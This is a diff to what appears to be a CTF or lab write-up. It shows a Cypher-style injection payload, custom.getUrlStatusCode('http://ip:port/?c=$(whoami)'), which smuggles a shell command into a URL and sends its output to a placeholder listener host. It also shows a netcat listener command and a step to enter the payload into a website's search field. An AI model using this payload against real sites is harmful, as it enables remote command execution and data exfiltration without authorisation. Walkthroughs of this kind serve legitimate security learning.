@@ -42,17 +42,17 @@ You dont have to use burpsuite. You can just paste the following payload into lo
 CALL custom.getUrlStatusCode("http://ip:port/?c=$(whoami)")
 ```
 
-### How this works?
 This payload uses custom function that tries to return a status code, but also executes command given at the end.
 
 ### How to use?
 
-Set up netcat listener on your port.
+1. Set up netcat listener on your port.
 
 ```bash
 nc -lnvp 4444
 ```
-Enter the payload and voilà, you just got yourself an RCE.
+
+2. Enter the payload into search query on the website.
 
 
 
